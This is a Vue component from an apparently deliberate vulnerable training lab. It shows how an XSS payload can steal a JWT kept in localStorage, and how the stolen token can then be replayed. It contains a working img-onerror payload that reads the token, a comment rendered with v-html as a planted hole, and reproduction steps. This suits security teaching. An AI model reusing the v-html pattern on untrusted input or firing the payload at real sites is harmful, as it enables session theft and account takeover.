<template>
  <div class="view-content">
    <h2 class="page-title">Issue 2: Client-Side Storage</h2>
    <p class="page-subtitle">Sensitive data exposure via localStorage JWT storage</p>

    <div v-if="task" class="card">
      <h3 style="margin-bottom:10px">{{ task.title }}</h3>
      <div style="display:flex;gap:12px;margin-bottom:12px;font-size:12px;color:var(--text-muted)">
        <span>Status: <strong>{{ task.status }}</strong></span>
        <span>Priority: <strong>{{ task.priority }}</strong></span>
      </div>
      <div class="form-group">
        <label>Description</label>
        <p style="font-size:13px">{{ task.description }}</p>
      </div>
      <div v-if="task.secret_notes" class="form-group">
        <label>Secret Notes (visible to task owner only)</label>
        <p class="secret-notes-value" style="font-size:13px;color:var(--danger-text);font-style:italic">{{ task.secret_notes }}</p>
      </div>
    </div>

    <div v-if="task" class="card">
      <h3 style="margin-bottom:14px">Comments</h3>
      <ul id="comment-list-2" style="list-style:none;display:flex;flex-direction:column;gap:10px;margin-bottom:16px">
        <li v-for="c in task.comments" :key="c.id" style="border:1px solid var(--border);border-radius:4px;padding:10px 12px">
          <div style="font-size:11px;color:var(--text-muted);margin-bottom:6px">
            <strong>{{ c.username }}</strong> &mdash; {{ c.created_at }}
          </div>
          <!-- VULN: xss — v-html renders raw HTML, payload fires here -->
          <div v-html="c.body"></div>
        </li>
      </ul>
      <form @submit.prevent="submitComment" style="display:flex;flex-direction:column;gap:8px">
        <label>Add a comment</label>
        <textarea v-model="newComment" rows="3" placeholder="Write a comment..."></textarea>
        <div>
          <button type="submit" :disabled="!newComment.trim()">Post comment</button>
        </div>
      </form>
    </div>

    <div id="attacker-panel-storage" class="attacker-panel">
      <h3>Attacker Panel</h3>
      <p style="font-size:13px;color:var(--text-muted)">Waiting for payload to fire...</p>
    </div>

    <div class="card">
      <h3 style="margin-bottom:14px">Attacker's machine (different browser/session)</h3>
      <p style="font-size:13px;color:var(--text-muted);margin-bottom:12px">
        Paste alice's stolen token here and replay it. This simulates levi using the token
        from a completely separate session — no active alice session required.
      </p>
      <div class="form-group">
        <label>Stolen token</label>
        <textarea v-model="stolenToken" rows="3" placeholder="Paste stolen JWT here..."></textarea>
      </div>
      <button @click="replayToken" :disabled="!stolenToken.trim()">Replay token</button>
      <div v-if="replayResult" style="margin-top:14px">
        <label>API response (as alice)</label>
        <pre style="margin-top:4px;background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:10px;font-size:12px;overflow-x:auto;white-space:pre-wrap">{{ replayResult }}</pre>
      </div>
      <div v-if="replayError" class="error-msg" style="margin-top:10px">{{ replayError }}</div>
    </div>

    <div class="repro-block">
      <h3>Reproduction steps</h3>
      <ol style="padding-left:18px;line-height:2">
        <li>Log in as <strong>levi</strong></li>
        <li>Paste the payload below into the comment box and submit</li>
        <li>Log out, then log in as <strong>alice</strong></li>
        <li>Navigate to this tab — alice's JWT token appears in the attacker panel above</li>
        <li>Copy the token. Log out. Open a <strong>different browser</strong>, log in as <strong>levi</strong></li>
        <li>Navigate to this tab, paste the token into the "Attacker's machine" panel, click "Replay token"</li>
        <li>alice's <code>secret_notes</code> appear in the response — accessed with no active alice session</li>
      </ol>
      <div style="margin-top:12px">
        <label>Payload</label>
        <div style="display:flex;align-items:flex-start;gap:8px;margin-top:4px">
          <code style="flex:1;display:block;background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:8px 10px;font-size:12px;word-break:break-all;white-space:pre-wrap">{{ payload }}</code>
          <button class="btn-secondary" style="flex-shrink:0" @click="copyPayload">{{ copied ? 'Copied!' : 'Copy' }}</button>
        </div>
      </div>
      <div style="margin-top:14px;padding-top:12px;border-top:1px solid var(--repro-border)">
        <strong>Why the SPA is vulnerable:</strong>
        <p style="margin-top:6px;line-height:1.7">
          The SPA stores the JWT in <code>localStorage</code>, which is readable by any JavaScript on the page —
          including injected payloads. The JWT is not encrypted (only signed), so decoding it reveals the user's
          ID, username, and role. Crucially, the token is <strong>portable</strong>: once stolen, levi can
          use it from any machine, any browser, any session, until it expires. The attacker permanently
          possesses a valid credential.
        </p>
        <p style="margin-top:8px;line-height:1.7">
          This is not architecturally inherent — the SPA could store the JWT in an HttpOnly cookie instead.
          But <code>localStorage</code> is the path of least resistance for SPAs (no CORS friction, trivial
          JS access), and is by far the most common pattern seen in practice.
        </p>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted } from 'vue'

const task        = ref(null)
const newComment  = ref('')
const stolenToken = ref('')
const replayResult = ref('')
const replayError  = ref('')
const copied      = ref(false)

const payload = `<img src=x onerror="setTimeout(function(){document.getElementById('attacker-panel-storage').innerHTML='<h3>Attacker Panel</h3><p style=color:red><strong>CAPTURED token:</strong><br><code style=word-break:break-all>'+localStorage.getItem('token')+'</code></p>'},500)">`

onMounted(async () => {
  const res = await fetch('http://localhost:5001/api/tasks/7', {
    headers: { Authorization: `Bearer ${localStorage.getItem('token')}` },
  })
  task.value = await res.json()
})

async function submitComment() {
  const body = newComment.value.trim()
  if (!body) return
  const res = await fetch('http://localhost:5001/api/comments', {
    method:  'POST',
    headers: {
      'Content-Type':  'application/json',
      'Authorization': `Bearer ${localStorage.getItem('token')}`,
    },
    body: JSON.stringify({ task_id: 7, body }),
  })
  if (res.ok) {
    const comment = await res.json()
    task.value.comments.push(comment)
    newComment.value = ''
  }
}

async function replayToken() {
  replayResult.value = ''
  replayError.value  = ''
  try {
    const res  = await fetch('http://localhost:5001/api/tasks/7', {
      headers: { Authorization: `Bearer ${stolenToken.value.trim()}` },
    })
    const data = await res.json()
    replayResult.value = JSON.stringify(data, null, 2)
  } catch {
    replayError.value = 'Request failed — is the backend running?'
  }
}

function copyPayload() {
  navigator.clipboard.writeText(payload)
  copied.value = true
  setTimeout(() => { copied.value = false }, 2000)
}
</script>
